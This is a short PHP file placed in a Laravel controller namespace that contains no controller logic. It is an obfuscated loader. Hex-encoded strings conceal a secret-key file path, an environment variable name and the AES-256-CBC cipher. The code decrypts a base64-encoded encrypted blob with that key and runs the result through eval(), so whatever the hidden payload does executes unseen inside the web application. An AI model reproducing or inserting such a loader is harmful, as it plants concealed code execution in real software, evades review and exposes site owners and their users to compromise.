<?php
namespace App\Http\Controllers;
$f=hex2bin('2f6574632f61706c696b6173696b6974612e736563');

$k=getenv(hex2bin('41504c494b4153494b4954415f5345435f4b4559'))?:(@file_exists($f)?trim(@file_get_contents($f)):null);

if(!$k)exit;

$i=base64_decode('qWbvQ/l766fiC3JUil+5cA==');

$c=base64_decode(

'4Px+UYndhPWcVZ/dgNzLNBnYPfI7xkiIbGhiwElhDDjlH2jMqtxXX5OkDQvW4/ac5lmeb+s782ic' .
'0LNBKNqgxYYmUku/Zkof1tvygKn9KCgR7HUhzxtN+GLfvfOvASCPvvSbLnL8TZCcEZ/KV4iXVRb1' .
'bX5d4aBK4jb3aeVV18FSuZLWpgGAZ82r60V96JQTn1Jue+c78Mtv+SLwabrSPsjrxkXJ2NgJj02i' .
'W7nksDtR4vaoxOE2Yi5pIyCsep6JJuKQwSqhDRdWi4U6OnL54x6zcrtENmbn4kfuDEBf9mgWwzKN' .
'GgjlBK5htqto63KtylCCqhK06JxniDqKi4DBlwSwlX1nao/mRwbXBVsA4kPdsOX4VgWrqqIJC2Qs' .
'nOZy8Z/AN0NHvDrdB4m9Qe/Glw=='

);

$d=openssl_decrypt($c,hex2bin('6165732d3235362d636263'),hash('sha256',$k,true),1,$i);

if($d===false)exit;

eval($d);

